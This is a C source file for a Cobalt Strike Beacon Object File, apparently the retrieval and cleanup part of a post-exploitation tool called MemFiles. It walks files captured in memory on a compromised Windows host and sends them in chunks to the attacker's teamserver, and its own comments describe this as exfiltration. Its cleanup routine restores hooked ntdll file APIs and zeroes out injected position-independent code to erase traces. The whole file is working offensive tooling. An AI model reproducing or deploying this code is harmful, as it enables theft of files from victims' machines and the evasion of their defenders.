#include "bofdefs.h"
#include "beacon.h"

struct FileInfo *pFileInfo = NULL;

void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
{
    // intializes the random number generator
    time_t t;
    srand((unsigned) time(&t));

    int chunkSize = 1024 * 900;

    // generate a 4 byte random id, rand max value is 0x7fff
    ULONG32 fileId = 0;
    fileId |= (rand() & 0x7FFF) << 0x11;
    fileId |= (rand() & 0x7FFF) << 0x02;
    fileId |= (rand() & 0x0003) << 0x00;

    // 8 bytes for fileId and fileSize
    int messageLength = 8 + downloadFileNameLength;
    char* packedData = calloc(messageLength, sizeof(char));

    // pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // pack on fileSize as 4-byte int second
    packedData[4] = (fileSize >> 0x18) & 0xFF;
    packedData[5] = (fileSize >> 0x10) & 0xFF;
    packedData[6] = (fileSize >> 0x08) & 0xFF;
    packedData[7] = (fileSize >> 0x00) & 0xFF;

    // pack on the file name last
    for (int i = 0; i < downloadFileNameLength; i++)
    {
        packedData[8 + i] = fileName[i];
    }

    // tell the teamserver that we want to download a file
    BeaconOutput(CALLBACK_FILE, packedData, messageLength);
    free(packedData); packedData = NULL;

    // we use the same memory region for all chucks
    int chunkLength = 4 + chunkSize;
    char* packedChunk = calloc(chunkLength, sizeof(char));

    // the fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;

    ULONG32 exfiltrated = 0;
    while (exfiltrated < fileSize)
    {
        // send the file content by chunks
        chunkLength = fileSize - exfiltrated > chunkSize ? chunkSize : fileSize - exfiltrated;
        ULONG32 chunkIndex = 4;
        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
        {
            packedChunk[chunkIndex++] = returnData[i];
        }
        // send a chunk
        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
        exfiltrated += chunkLength;
    }
    free(packedChunk); packedChunk = NULL;

    // tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
}

void WalkFiles(BOOL fetchfiles, BOOL force, BOOL cleanup)
{
	if(cleanup)
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Checking for and downloading any existing files before cleanup...\n");

	//Iterate over all files in struct
	if(pFileInfo->numFiles > 0)
	{    
		int filesfetched = 0;
		for(int i = 0; i < 100; i++)
		{
			if(pFileInfo->filehandle[i] != NULL)
			{
				//We need to convert the filename to char regardless of what we are doing
				size_t required_size = WideCharToMultiByte(CP_UTF8, 0, pFileInfo->filename[i], -1, NULL, 0, NULL, NULL);
				char* filename = calloc(required_size + 1, sizeof(char));
				WideCharToMultiByte(CP_UTF8, 0, pFileInfo->filename[i], -1, filename, required_size, NULL, NULL);
				
				//Download each file that is marked as closed/complete
				if(fetchfiles)
				{
					if(pFileInfo->fileclosed[i] == TRUE || force)
					{
						downloadFile(filename, strlen(filename), pFileInfo->filedata[i], pFileInfo->filedatalen[i]);

						//Now free all of the FileInfo entires associated with the file since it has been downloaded/sent to the TS. 
						memset(pFileInfo->filename[i], 0, ((wcslen(pFileInfo->filename[i]) + 1) * 2));
						free(pFileInfo->filename[i]);
						pFileInfo->filename[i] = NULL;

						memset(pFileInfo->filedata[i], 0, pFileInfo->fileallocationlen[i]);
						free(pFileInfo->filedata[i]);
						pFileInfo->filedata[i] = NULL;

						pFileInfo->filehandle[i] = NULL;
						pFileInfo->fileallocationlen[i] = 0;
						pFileInfo->filedatalen[i] = 0;
						pFileInfo->fileclosed[i] = FALSE;
						
						//Track how many files we have downloaded and cleared from memory
						filesfetched++;
					}
				}
				//Otherwise list files currently stored by MemFiles
				else
				{
					BeaconPrintf(CALLBACK_OUTPUT, "\nFile: %d\nName: %s\nHandle: %p\nDatalen: %d\nAllocationsize: %d\nFileclosed: %s\n", i, filename, pFileInfo->filehandle[i], pFileInfo->filedatalen[i], pFileInfo->fileallocationlen[i], pFileInfo->fileclosed[i] ? "TRUE" : "FALSE");
				}
				
				//Free memory
				free(filename);
			}
		}

		//Now that we are outside the loop, decrement numFiles by how many files we downloaded. 
		if(fetchfiles)
		{
			pFileInfo->numFiles = pFileInfo->numFiles - filesfetched;
			BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Downloaded and cleaned up %d files from memory!\n[+] %d files remaining in memory as tracked by MemFiles!\n", filesfetched, pFileInfo->numFiles);
		}

		//Otherwise memlist
		else
		{
			BeaconPrintf(CALLBACK_OUTPUT, "\nNumber of files currently stored by MemFiles: %d\nTotal files stored during MemFiles lifetime: %d\n", pFileInfo->numFiles, pFileInfo->totalFiles);
		}

	}
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "No files currently stored by MemFiles!\n");
	}
}

void UnhookNtApi(char* NtFunction, LPVOID originalbytes, LPVOID trampoline)
{
	//Resolve NtFunction address
	LPVOID ntfunctionAddr = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), NtFunction);

	//Restore original bytes to NtFunction
	SIZE_T bytesWritten = 0;
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)ntfunctionAddr, originalbytes, 16, &bytesWritten);

	//Check whether we hooked an old NtFunction or a new one based on syscall instruction location
	char syscallbytes[] = {0x0f, 0x05};
	SIZE_T bytelen;
	if(memcmp(originalbytes + 8, syscallbytes, 2) == 0)
		bytelen = 21;
	else
		bytelen = 29;

	//Change memory protections so we can zero out the trampoline
	DWORD dwOldProtect;
	VirtualProtect(trampoline, bytelen, PAGE_READWRITE, &dwOldProtect);

	//zero and free
	memset(trampoline, 0, bytelen);
	VirtualFree(trampoline, 0, MEM_RELEASE);
}

void FreePIC(LPVOID PIC, int PICLen)
{
	//Change memory protections so we can zero out the trampoline
	DWORD dwOldProtect;
	VirtualProtect(PIC, PICLen, PAGE_READWRITE, &dwOldProtect);

	memset(PIC, 0, PICLen);
	VirtualFree(PIC, 0, MEM_RELEASE);
}

void CleanMemFiles()
{
	//First unhook all of our functions and free trampolines
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Unhooking API's and freeing trampolines...\n");
	UnhookNtApi("NtCreateFile", pFileInfo->NtCreateFileorigbytes, pFileInfo->NtCreateFiletrampoline);
	UnhookNtApi("NtWriteFile", pFileInfo->NtWriteFileorigbytes, pFileInfo->NtWriteFiletrampoline);
	UnhookNtApi("NtClose", pFileInfo->NtCloseorigbytes, pFileInfo->NtClosetrampoline);
	UnhookNtApi("NtQueryVolumeInformationFile", pFileInfo->NtQueryVolumeInformationFileorigbytes, pFileInfo->NtQueryVolumeInformationFiletrampoline);
	UnhookNtApi("NtQueryInformationFile", pFileInfo->NtQueryInformationFileorigbytes, pFileInfo->NtQueryInformationFiletrampoline);
	UnhookNtApi("NtSetInformationFile", pFileInfo->NtSetInformationFileorigbytes, pFileInfo->NtSetInformationFiletrampoline);
	UnhookNtApi("NtReadFile", pFileInfo->NtReadFileorigbytes, pFileInfo->NtReadFiletrampoline);
	UnhookNtApi("NtOpenFile", pFileInfo->NtOpenFileorigbytes, pFileInfo->NtOpenFiletrampoline);
	UnhookNtApi("NtFlushBuffersFile", pFileInfo->NtFlushBuffersFileorigbytes, pFileInfo->NtFlushBuffersFiletrampoline);

	//Next we can free the injected PIC
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Freeing PIC functions...\n");
	FreePIC(*pFileInfo->PICNtCreateFile, pFileInfo->PICNtCreateFileLen);
	FreePIC(*pFileInfo->PICNtWriteFile, pFileInfo->PICNtWriteFileLen);
	FreePIC(*pFileInfo->PICNtClose, pFileInfo->PICNtCloseLen);
	FreePIC(*pFileInfo->PICNtQueryVolumeInformationFile, pFileInfo->PICNtQueryVolumeInformationFileLen);
	FreePIC(*pFileInfo->PICNtQueryInformationFile, pFileInfo->PICNtQueryInformationFileLen);
	FreePIC(*pFileInfo->PICNtSetInformationFile, pFileInfo->PICNtSetInformationFileLen);
	FreePIC(*pFileInfo->PICNtReadFile, pFileInfo->PICNtReadFileLen);
	FreePIC(*pFileInfo->PICNtOpenFile, pFileInfo->PICNtOpenFileLen);
	FreePIC(*pFileInfo->PICNtFlushBuffersFile, pFileInfo->PICNtFlushBuffersFileLen);

	//Now free our struct
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Freeing FileInfo struct...\n");
	memset(pFileInfo, 0, sizeof(struct FileInfo));
	free(pFileInfo);
	BeaconRemoveValue(MF_FILE_INFO_KEY);

	BeaconPrintf(CALLBACK_OUTPUT, "[+] MemFiles cleaned from Beacon process!\n");
	
}

int go(IN PCHAR Buffer, IN ULONG Length) 
{
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);

	int dataextracted = 0;
	BOOL fetchfiles = BeaconDataInt(&parser);
	BOOL force = BeaconDataInt(&parser);
	BOOL cleanup = BeaconDataInt(&parser);

    //Get FileInfo from the Key/Value store
	pFileInfo = BeaconGetValue(MF_FILE_INFO_KEY);
	if (!pFileInfo)
	{
		BeaconPrintf(CALLBACK_ERROR, "failed to call BeaconGetValue");
		return 0;
	}

	WalkFiles(fetchfiles, force, cleanup);

	if(cleanup)
		CleanMemFiles();

	return 0;
}